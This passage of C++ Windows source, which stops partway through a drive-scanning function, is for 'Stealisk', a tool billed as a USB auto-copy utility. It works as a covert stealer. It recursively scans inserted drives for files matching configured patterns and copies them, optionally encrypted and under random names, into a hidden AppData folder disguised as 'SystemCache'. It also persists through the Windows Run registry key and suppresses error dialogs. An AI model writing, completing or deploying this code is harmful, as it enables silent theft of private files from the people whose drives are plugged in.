// Stealisk.cpp
// 完全无硬编码的USB文件自动复制工具 (Unicode版本)
// 编译命令见 compile.bat

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <eh.h>
#include <exception>
#include <shlobj.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <dbt.h>
#include <psapi.h>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <algorithm>
#include <cctype>
#include <iostream>
#include <shellapi.h>
#include <wincrypt.h>
#include "resource.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ole32.lib")

// ==================== 辅助函数：UTF-8 ↔ UTF-16 ====================
static std::wstring Utf8ToWide(const std::string& utf8) {
    if (utf8.empty()) return L"";
    int len = MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, NULL, 0);
    if (len <= 0) {
        // 备用：尝试 ANSI 代码页
        len = MultiByteToWideChar(CP_ACP, 0, utf8.c_str(), -1, NULL, 0);
        if (len <= 0) return L"";
        std::vector<wchar_t> wbuf(len);
        MultiByteToWideChar(CP_ACP, 0, utf8.c_str(), -1, wbuf.data(), len);
        return std::wstring(wbuf.data());
    }
    std::vector<wchar_t> wbuf(len);
    MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, wbuf.data(), len);
    return std::wstring(wbuf.data());
}

static std::string WideToUtf8(const std::wstring& wide) {
    if (wide.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), -1, NULL, 0, NULL, NULL);
    if (len <= 0) return "";
    std::vector<char> buf(len);
    WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), -1, buf.data(), len, NULL, NULL);
    return std::string(buf.data());
}

// ==================== 全局错误模式 ====================
static void SetGlobalErrorMode() {
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
}

// ==================== 日志 ====================
static void WriteLog(const std::string& msg, bool debug = false) {
    try {
        wchar_t logPath[MAX_PATH];
        GetTempPathW(MAX_PATH, logPath);
        PathAppendW(logPath, debug ? L"Stealisk_debug.log" : L"Stealisk.log");
        HANDLE hFile = CreateFileW(logPath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
        SYSTEMTIME st;
        GetLocalTime(&st);
        char timeBuf[64];
        sprintf_s(timeBuf, "%04d-%02d-%02d %02d:%02d:%02d ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        DWORD written;
        WriteFile(hFile, timeBuf, strlen(timeBuf), &written, NULL);
        WriteFile(hFile, msg.c_str(), msg.length(), &written, NULL);
        WriteFile(hFile, "\r\n", 2, &written, NULL);
        CloseHandle(hFile);
    } catch (...) {}
}

// ==================== 资源提取 ====================
static bool ExtractResourceToFile(LPCWSTR lpName, LPCWSTR lpType, LPCWSTR outputPath) {
    HRSRC hRes = FindResourceW(NULL, lpName, lpType);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;
    DWORD dataSize = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);
    if (!pData) return false;
    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, outputPath);
    PathRemoveFileSpecW(dir);
    if (!PathFileExistsW(dir)) {
        SHCreateDirectoryExW(NULL, dir, NULL);
    }
    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written;
    BOOL ok = WriteFile(hFile, pData, dataSize, &written, NULL);
    CloseHandle(hFile);
    return ok && (written == dataSize);
}

static bool ExtractDefaultConfig() {
    wchar_t configPath[MAX_PATH];
    GetModuleFileNameW(NULL, configPath, MAX_PATH);
    PathRemoveFileSpecW(configPath);
    PathAppendW(configPath, L"Stealisk.ini");
    if (PathFileExistsW(configPath)) return true;
    return ExtractResourceToFile(MAKEINTRESOURCEW(1), RT_RCDATA, configPath);
}

// ==================== PID 文件管理 ====================
static std::wstring GetPidFilePath() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    PathAppendW(tempPath, L"Stealisk.pid");
    return std::wstring(tempPath);
}

static void WritePidFile(DWORD pid) {
    std::wstring path = GetPidFilePath();
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    std::string content = std::to_string(pid);
    DWORD written;
    WriteFile(hFile, content.c_str(), content.size(), &written, NULL);
    CloseHandle(hFile);
}

static DWORD ReadPidFile() {
    std::wstring path = GetPidFilePath();
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 32) {
        CloseHandle(hFile);
        return 0;
    }
    std::vector<char> buffer(fileSize + 1, 0);
    DWORD bytesRead;
    ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    std::string content(buffer.data(), bytesRead);
    try { return std::stoul(content); }
    catch (...) { return 0; }
}

static void DeletePidFile() {
    std::wstring path = GetPidFilePath();
    DeleteFileW(path.c_str());
}

// ==================== 配置管理 ====================
static std::string ReadFileToString(const wchar_t* path) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return "";
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 1024 * 1024) {
        CloseHandle(hFile);
        return "";
    }
    std::vector<char> buffer(fileSize + 1, 0);
    DWORD bytesRead;
    ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    return std::string(buffer.data(), bytesRead);
}

static std::map<std::string, std::string> ParseIniToMap(const std::string& content) {
    std::map<std::string, std::string> result;
    try {
        std::istringstream iss(content);
        std::string line, section;
        while (std::getline(iss, line)) {
            size_t start = line.find_first_not_of(" \t\r\n");
            if (start == std::string::npos) continue;
            line = line.substr(start);
            size_t end = line.find_last_not_of(" \t\r\n");
            if (end != std::string::npos) line = line.substr(0, end + 1);
            if (line.empty()) continue;
            if (line.front() == '[' && line.back() == ']') {
                section = line.substr(1, line.length() - 2);
                continue;
            }
            size_t eq = line.find('=');
            if (eq != std::string::npos) {
                std::string key = line.substr(0, eq);
                std::string value = line.substr(eq + 1);
                key.erase(0, key.find_first_not_of(" \t\r\n"));
                key.erase(key.find_last_not_of(" \t\r\n") + 1);
                value.erase(0, value.find_first_not_of(" \t\r\n"));
                value.erase(value.find_last_not_of(" \t\r\n") + 1);
                if (!section.empty()) {
                    result[section + "." + key] = value;
                } else {
                    result[key] = value;
                }
            }
        }
    } catch (...) {
        WriteLog("ParseIniToMap exception", true);
    }
    return result;
}

static std::map<std::string, std::string> LoadDefaultConfigMap() {
    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(1), RT_RCDATA);
    if (!hRes) return {};
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return {};
    DWORD size = SizeofResource(NULL, hRes);
    char* data = (char*)LockResource(hData);
    if (!data) return {};
    std::string defaultIni(data, size);
    return ParseIniToMap(defaultIni);
}

static void WriteIniFile(const wchar_t* path, const std::map<std::string, std::string>& raw) {
    try {
        wchar_t tempPath[MAX_PATH];
        wcscpy_s(tempPath, path);
        wcscat_s(tempPath, L".tmp");
        HANDLE hFile = CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            WriteLog("WriteIniFile: Cannot create temp file", true);
            return;
        }
        std::map<std::string, std::map<std::string, std::string>> sections;
        for (const auto& [fullKey, value] : raw) {
            std::string safeValue = value;
            const size_t MAX_VAL = 16384;
            if (safeValue.length() > MAX_VAL) {
                safeValue = safeValue.substr(0, MAX_VAL);
                WriteLog("Truncated oversized value: " + fullKey, true);
            }
            size_t dot = fullKey.find('.');
            if (dot != std::string::npos) {
                std::string section = fullKey.substr(0, dot);
                std::string key = fullKey.substr(dot + 1);
                sections[section][key] = safeValue;
            }
        }
        auto WriteLine = [&](const std::string& line) -> bool {
            DWORD written;
            return WriteFile(hFile, line.c_str(), line.length(), &written, NULL) && written == line.length();
        };
        for (const auto& [section, keys] : sections) {
            std::string line = "[" + section + "]\n";
            if (!WriteLine(line)) { CloseHandle(hFile); DeleteFileW(tempPath); return; }
            for (const auto& [key, value] : keys) {
                line = key + " = " + value + "\n";
                if (!WriteLine(line)) { CloseHandle(hFile); DeleteFileW(tempPath); return; }
            }
            if (!WriteLine("\n")) { CloseHandle(hFile); DeleteFileW(tempPath); return; }
        }
        CloseHandle(hFile);
        DeleteFileW(path);
        if (!MoveFileW(tempPath, path)) {
            WriteLog("WriteIniFile: MoveFile failed", true);
            DeleteFileW(tempPath);
        }
    } catch (const std::exception& e) {
        WriteLog("WriteIniFile exception: " + std::string(e.what()), true);
    } catch (...) {
        WriteLog("WriteIniFile unknown exception", true);
    }
}

struct Config {
    std::map<std::string, std::string> raw;
    mutable std::vector<std::wstring> cachedNameContainsW;
    mutable bool nameContainsWLoaded = false;

    std::vector<std::string> GetExtensions() const { return ParseList(Get("Filter", "extensions")); }
    std::vector<std::string> GetNameContains() const { return ParseList(Get("Filter", "name_contains")); }
    
    std::vector<std::wstring> GetNameContainsW() const {
        if (!nameContainsWLoaded) {
            cachedNameContainsW.clear();
            auto names = GetNameContains();
            for (const auto& name : names) {
                std::wstring wname = Utf8ToWide(name);
                if (!wname.empty()) {
                    cachedNameContainsW.push_back(wname);
                }
            }
            nameContainsWLoaded = true;
        }
        return cachedNameContainsW;
    }

    bool GetCaseSensitive() const { return GetBool("Filter", "case_sensitive"); }
    bool GetAutoCopy() const { return GetBool("Options", "auto_copy"); }
    bool GetShowTray() const { return GetBool("Options", "show_tray"); }
    bool GetEnableEncrypt() const { return GetBool("Options", "enable_encrypt"); }
    bool GetAutoStartBoot() const { return GetBool("Options", "auto_start_boot"); }
    bool GetAutoStartService() const { return GetBool("Options", "auto_start_service"); }
    bool GetRandomizeFilename() const { return GetBool("Options", "randomize_filename"); }
    int GetScanDelaySeconds() const {
        try { return std::stoi(Get("Options", "scan_delay_seconds")); }
        catch (...) { return 1; }
    }
    int GetScanIntervalSeconds() const {
        try { return std::stoi(Get("Options", "scan_interval_seconds")); }
        catch (...) { return 15; }
    }
    std::wstring GetTargetDir() const {
        std::string v = Get("Options", "target_dir");
        return Utf8ToWide(v);
    }
    std::wstring GetWorkerName() const {
        std::string v = Get("Options", "worker_name");
        return Utf8ToWide(v);
    }
    std::string GetLanguage() const { return Get("Options", "language"); }
    std::string GetEncKeyHex() const { return Get("Encryption", "key"); }
private:
    std::string Get(const std::string& section, const std::string& key) const {
        std::string fullKey = section + "." + key;
        auto it = raw.find(fullKey);
        return (it != raw.end()) ? it->second : "";
    }
    bool GetBool(const std::string& section, const std::string& key) const {
        return Get(section, key) == "true";
    }
    std::vector<std::string> ParseList(const std::string& val) const {
        std::vector<std::string> result;
        try {
            std::stringstream ss(val);
            std::string item;
            while (std::getline(ss, item, ',')) {
                result.push_back(item);
            }
        } catch (...) {
            WriteLog("ParseList exception", true);
        }
        return result;
    }
};

static Config LoadConfig() {
    wchar_t configPath[MAX_PATH];
    GetModuleFileNameW(NULL, configPath, MAX_PATH);
    PathRemoveFileSpecW(configPath);
    PathAppendW(configPath, L"Stealisk.ini");
    Config cfg;
    try {
        cfg.raw = LoadDefaultConfigMap();
        std::string diskContent = ReadFileToString(configPath);
        if (!diskContent.empty()) {
            auto diskMap = ParseIniToMap(diskContent);
            for (const auto& [key, value] : diskMap) {
                cfg.raw[key] = value;
            }
        }
        WriteIniFile(configPath, cfg.raw);
    } catch (const std::exception& e) {
        WriteLog("LoadConfig exception: " + std::string(e.what()), true);
    } catch (...) {
        WriteLog("LoadConfig unknown exception", true);
    }
    return cfg;
}

// ==================== 语言管理 ====================
struct Language {
    std::map<std::string, std::string> strings;
    std::string appName;
};

static bool LoadLanguageFromResource(const std::string& langCode, Language& lang) {
    std::wstring wcode = Utf8ToWide(langCode);
    HRSRC hRes = FindResourceW(NULL, wcode.c_str(), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;
    DWORD size = SizeofResource(NULL, hRes);
    char* data = (char*)LockResource(hData);
    if (!data) return false;
    std::string content(data, size);
    std::istringstream iss(content);
    std::string line;
    while (std::getline(iss, line)) {
        if (line.empty() || line[0] == '[') continue;
        size_t eq = line.find('=');
        if (eq != std::string::npos) {
            std::string key = line.substr(0, eq);
            std::string value = line.substr(eq + 1);
            key.erase(0, key.find_first_not_of(" \t\r\n"));
            key.erase(key.find_last_not_of(" \t\r\n") + 1);
            value.erase(0, value.find_first_not_of(" \t\r\n"));
            value.erase(value.find_last_not_of(" \t\r\n") + 1);
            lang.strings[key] = value;
            if (key == "app_name") lang.appName = value;
        }
    }
    return true;
}

static BOOL CALLBACK EnumResourceNamesProc(HMODULE hModule, LPCWSTR lpszType, LPWSTR lpszName, LONG_PTR lParam) {
    auto* vec = reinterpret_cast<std::vector<std::string>*>(lParam);
    if (!IS_INTRESOURCE(lpszName)) {
        std::wstring wname(lpszName);
        vec->push_back(WideToUtf8(wname));
    }
    return TRUE;
}

static std::vector<std::string> EnumerateAvailableLanguages() {
    std::vector<std::string> langs;
    EnumResourceNamesW(NULL, RT_RCDATA, EnumResourceNamesProc, (LONG_PTR)&langs);
    return langs;
}

static std::string GetLangString(const Language& lang, const std::string& key, const std::map<std::string, std::string>& vars = {}) {
    try {
        std::string result = lang.strings.count(key) ? lang.strings.at(key) : key;
        for (const auto& [k, v] : vars) {
            std::string placeholder = "{" + k + "}";
            size_t pos = 0;
            while ((pos = result.find(placeholder, pos)) != std::string::npos) {
                result.replace(pos, placeholder.length(), v);
                pos += v.length();
            }
        }
        return result;
    } catch (...) {
        return key;
    }
}

static Language InitLanguage(const Config& cfg) {
    auto langs = EnumerateAvailableLanguages();
    if (langs.empty()) return Language();
    Language lang;
    std::string langCode = cfg.GetLanguage();
    if (!langCode.empty() && LoadLanguageFromResource(langCode, lang)) {
        WriteLog("Loaded language from resource: " + langCode, true);
        return lang;
    }
    for (const auto& l : langs) {
        if (LoadLanguageFromResource(l, lang)) {
            WriteLog("Fallback language from resource: " + l, true);
            return lang;
        }
    }
    return Language();
}

// ==================== 加密 ====================
static std::vector<BYTE> HexToBytes(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i + 1 < hex.length(); i += 2) {
        std::string byteStr = hex.substr(i, 2);
        BYTE byte = (BYTE)strtol(byteStr.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

static bool EncryptFile(const std::wstring& inputPath, const std::wstring& outputPath, const std::string& keyHex) {
    if (keyHex.length() != 64) return false;
    std::vector<BYTE> keyBytes = HexToBytes(keyHex);
    if (keyBytes.size() != 32) return false;
    HANDLE hIn = CreateFileW(inputPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) return false;
    DWORD inSize = GetFileSize(hIn, NULL);
    std::vector<BYTE> plainData(inSize);
    if (inSize > 0) {
        DWORD read;
        ReadFile(hIn, plainData.data(), inSize, &read, NULL);
    }
    CloseHandle(hIn);
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    BYTE iv[16];
    if (!CryptGenRandom(hProv, 16, iv)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }
    HCRYPTKEY hKey = 0;
    struct AesKeyBlob {
        BLOBHEADER hdr;
        DWORD keySize;
        BYTE keyBytes[32];
    } keyBlob;
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_256;
    keyBlob.keySize = 32;
    memcpy(keyBlob.keyBytes, keyBytes.data(), 32);
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return false;
    }
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return false;
    }
    DWORD outSize = inSize + 16;
    std::vector<BYTE> cipherData(outSize);
    if (inSize > 0) memcpy(cipherData.data(), plainData.data(), inSize);
    DWORD tempSize = inSize;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, cipherData.data(), &tempSize, outSize)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return false;
    }
    HANDLE hOut = CreateFileW(outputPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return false;
    }
    DWORD written;
    WriteFile(hOut, iv, 16, &written, NULL);
    WriteFile(hOut, cipherData.data(), tempSize, &written, NULL);
    CloseHandle(hOut);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return true;
}

// ==================== 辅助功能 ====================
static void SetAutoStartBoot(bool enable) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (enable) {
            Config cfg = LoadConfig();
            wchar_t exePath[MAX_PATH], workerPath[MAX_PATH];
            GetModuleFileNameW(NULL, exePath, MAX_PATH);
            wcscpy_s(workerPath, exePath);
            PathRemoveFileSpecW(workerPath);
            PathAppendW(workerPath, cfg.GetWorkerName().c_str());
            wchar_t cmdLine[MAX_PATH * 2];
            swprintf_s(cmdLine, L"\"%s\" --worker", workerPath);
            RegSetValueExW(hKey, L"Stealisk", 0, REG_SZ, (BYTE*)cmdLine, (wcslen(cmdLine) + 1) * sizeof(wchar_t));
        } else {
            RegDeleteValueW(hKey, L"Stealisk");
        }
        RegCloseKey(hKey);
    }
}

static std::wstring GetTargetRoot(const Config& cfg) {
    std::wstring target = cfg.GetTargetDir();
    if (!target.empty()) return target;
    wchar_t appData[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    return std::wstring(appData) + L"\\SystemCache";
}

static void EnsureHiddenDirectory(const std::wstring& dir) {
    if (!PathFileExistsW(dir.c_str())) {
        CreateDirectoryW(dir.c_str(), NULL);
    }
    SetFileAttributesW(dir.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

static std::wstring GetUniqueFilename(const std::wstring& targetPath) {
    if (!PathFileExistsW(targetPath.c_str())) return targetPath;
    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, targetPath.c_str());
    PathRemoveFileSpecW(dir);
    wchar_t baseName[MAX_PATH];
    wcscpy_s(baseName, targetPath.c_str());
    PathStripPathW(baseName);
    std::wstring stem = baseName;
    size_t dot = stem.find_last_of(L'.');
    std::wstring ext;
    if (dot != std::wstring::npos) {
        ext = stem.substr(dot);
        stem = stem.substr(0, dot);
    }
    int counter = 1;
    while (true) {
        wchar_t newPath[MAX_PATH];
        swprintf_s(newPath, L"%s\\%s_%d%s", dir, stem.c_str(), counter, ext.c_str());
        if (!PathFileExistsW(newPath)) return newPath;
        counter++;
    }
}

static std::wstring GenerateRandomFilename(const std::wstring& originalPath) {
    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, originalPath.c_str());
    PathRemoveFileSpecW(dir);
    wchar_t baseName[MAX_PATH];
    wcscpy_s(baseName, originalPath.c_str());
    PathStripPathW(baseName);
    std::wstring stem = baseName;
    std::wstring ext;
    size_t dot = stem.find_last_of(L'.');
    if (dot != std::wstring::npos) {
        ext = stem.substr(dot);
        stem = stem.substr(0, dot);
    }
    GUID guid;
    CoCreateGuid(&guid);
    wchar_t randomStr[40];
    swprintf_s(randomStr, L"%08x%04x%04x%04x%04x%04x%04x",
        guid.Data1, guid.Data2, guid.Data3,
        (guid.Data4[0] << 8) | guid.Data4[1],
        (guid.Data4[2] << 8) | guid.Data4[3],
        (guid.Data4[4] << 8) | guid.Data4[5],
        (guid.Data4[6] << 8) | guid.Data4[7]);
    std::wstring newName = std::wstring(dir) + L"\\" + randomStr + ext;
    return newName;
}

static bool MatchExtension(const std::string& fileNameExt, const std::string& pattern, bool caseSens) {
    std::string fileExt = fileNameExt;
    std::string pat = pattern;
    if (!caseSens) {
        std::transform(fileExt.begin(), fileExt.end(), fileExt.begin(), ::tolower);
        std::transform(pat.begin(), pat.end(), pat.begin(), ::tolower);
    }
    if (pat == "*") return true;
    if (!pat.empty() && pat[0] == '*') pat = pat.substr(1);
    if (!pat.empty() && pat[0] != '.') pat = "." + pat;
    return fileExt == pat;
}

static bool MatchNameContains(const std::wstring& fileName, const std::wstring& pattern, bool caseSens) {
    std::wstring name = fileName;
    std::wstring pat = pattern;
    if (!caseSens) {
        std::transform(name.begin(), name.end(), name.begin(), ::towlower);
        std::transform(pat.begin(), pat.end(), pat.begin(), ::towlower);
    }
    if (pat == L"*") return true;
    if (pat.front() == L'*' && pat.back() == L'*') {
        std::wstring mid = pat.substr(1, pat.length() - 2);
        return name.find(mid) != std::wstring::npos;
    }
    if (pat.front() == L'*') {
        std::wstring suffix = pat.substr(1);
        return name.length() >= suffix.length() &&
               name.compare(name.length() - suffix.length(), suffix.length(), suffix) == 0;
    }
    if (pat.back() == L'*') {
        std::wstring prefix = pat.substr(0, pat.length() - 1);
        return name.length() >= prefix.length() &&
               name.compare(0, prefix.length(), prefix) == 0;
    }
    return name.find(pat) != std::wstring::npos;
}

static bool IsFileMatched(const std::wstring& fileName, const Config& cfg) {
    auto extensions = cfg.GetExtensions();
    auto nameContainsW = cfg.GetNameContainsW();
    bool caseSens = cfg.GetCaseSensitive();

    std::wstring namePart = fileName;
    std::wstring extPart;
    size_t dot = fileName.find_last_of(L'.');
    if (dot != std::wstring::npos) {
        extPart = fileName.substr(dot);
        namePart = fileName.substr(0, dot);
    }
    std::string extA(extPart.begin(), extPart.end());

    bool extMatch = false;
    if (extensions.empty()) {
        extMatch = true;
    } else {
        for (const auto& ext : extensions) {
            if (MatchExtension(extA, ext, caseSens)) {
                extMatch = true;
                break;
            }
        }
    }

    bool nameMatch = false;
    if (nameContainsW.empty()) {
        nameMatch = true;
    } else {
        for (const auto& kw : nameContainsW) {
            if (MatchNameContains(namePart, kw, caseSens)) {
                nameMatch = true;
                break;
            }
        }
    }

    return extMatch && nameMatch;
}

static std::string CalculateFileHash(const std::wstring& filePath) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return "";
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string result;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CloseHandle(hFile);
        return "";
    }
    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        CloseHandle(hFile);
        return "";
    }
    BYTE buffer[8192];
    DWORD bytesRead;
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        CryptHashData(hHash, buffer, bytesRead, 0);
    }
    CloseHandle(hFile);
    DWORD hashSize = 0;
    DWORD paramSize = sizeof(DWORD);
    CryptGetHashParam(hHash, HP_HASHSIZE, (BYTE*)&hashSize, &paramSize, 0);
    std::vector<BYTE> hashBytes(hashSize);
    CryptGetHashParam(hHash, HP_HASHVAL, hashBytes.data(), &hashSize, 0);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    char hex[64];
    for (DWORD i = 0; i < hashSize && i < 20; i++) {
        sprintf_s(hex + i * 2, 3, "%02x", hashBytes[i]);
    }
    result = std::string(hex, hashSize * 2);
    return result;
}

static std::wstring GetHashDBPath() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    PathAppendW(tempPath, L"Stealisk_hashes.db");
    return std::wstring(tempPath);
}

static std::set<std::string> LoadCopiedHashes() {
    std::set<std::string> hashes;
    std::wstring path = GetHashDBPath();
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return hashes;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize > 0 && fileSize < 1024 * 1024) {
        std::vector<char> buffer(fileSize + 1, 0);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL);
        std::string content(buffer.data(), bytesRead);
        std::istringstream iss(content);
        std::string line;
        while (std::getline(iss, line)) {
            if (!line.empty()) hashes.insert(line);
        }
    }
    CloseHandle(hFile);
    return hashes;
}

static void SaveCopiedHashes(const std::set<std::string>& hashes) {
    std::wstring path = GetHashDBPath();
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    std::string content;
    content.reserve(hashes.size() * 64);
    for (const auto& h : hashes) {
        content += h;
        content += "\n";
    }
    DWORD written;
    WriteFile(hFile, content.c_str(), content.size(), &written, NULL);
    CloseHandle(hFile);
}

// ==================== 全局状态变量 ====================
static HANDLE g_recordMutex = NULL;
static std::set<std::string> g_copiedFileHashes;
static volatile bool g_stopCopyFlag = false;
static volatile bool g_scanInProgress = false;
static volatile bool g_scanStopRequested = false;
static volatile bool g_workerStopRequested = false;

static std::wstring GetScanLockPath() {
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    PathAppendW(tempPath, L"Stealisk_scanning.lock");
    return std::wstring(tempPath);
}

static bool IsScanning() {
    std::wstring path = GetScanLockPath();
    return PathFileExistsW(path.c_str());
}

static void CreateScanLock() {
    std::wstring path = GetScanLockPath();
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
}

static void RemoveScanLock() {
    std::wstring path = GetScanLockPath();
    DeleteFileW(path.c_str());
}

// ==================== 复制逻辑 ====================
static bool IsAlreadyCopied(const std::wstring& srcPath) {
    WaitForSingleObject(g_recordMutex, INFINITE);
    std::string fileHash = CalculateFileHash(srcPath);
    bool exists = false;
    if (!fileHash.empty()) {
        exists = (g_copiedFileHashes.find(fileHash) != g_copiedFileHashes.end());
        if (!exists) {
            g_copiedFileHashes.insert(fileHash);
            SaveCopiedHashes(g_copiedFileHashes);
        }
    }
    ReleaseMutex(g_recordMutex);
    if (exists) {
        WriteLog("Skipping duplicate (hash match): " + std::string(srcPath.begin(), srcPath.end()));
    }
    return exists;
}

static bool CopyOrEncryptFile(const std::wstring& src, const std::wstring& dst, const Config& cfg) {
    if (IsAlreadyCopied(src)) return false;
    bool result;
    std::wstring finalDst = dst;
    if (cfg.GetRandomizeFilename()) {
        finalDst = GenerateRandomFilename(dst);
    }
    if (cfg.GetEnableEncrypt()) {
        result = EncryptFile(src, finalDst, cfg.GetEncKeyHex());
    } else {
        result = CopyFileW(src.c_str(), finalDst.c_str(), FALSE);
    }
    if (result) {
        WriteLog("Copied: " + std::string(src.begin(), src.end()) + " -> " + std::string(finalDst.begin(), finalDst.end()));
    } else {
        WriteLog("Failed to copy: " + std::string(src.begin(), src.end()));
    }
    return result;
}

static void ScanDrive(const std::wstring& driveRoot, const Config& cfg, const std::wstring& targetRoot) {
    std::wstring searchPath = driveRoot + L"*.*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (g_scanStopRequested || g_workerStopRequested) {
            WriteLog("Scan stopped by request", true);
            break;
        }
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring fullPath = driveRoot + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            ScanDrive(fullPath + L"\\", cfg, targetRoot);
        } else {
            if (IsFileMatched(fd.cFileName, cfg)) {
                std::wstring relative;
                if (fullPath.find(driveRoot) == 0) relative = fullPath.substr(driveRoot.length());
                else relative = fd.cFileName;
                std::wstring destPath = targetRoot + L"\\" + relative;
                wchar_t destDir[MAX_PATH];
                wcscpy_s(destDir, destPath.c_str());
                PathRemoveFileSpecW(destDir);
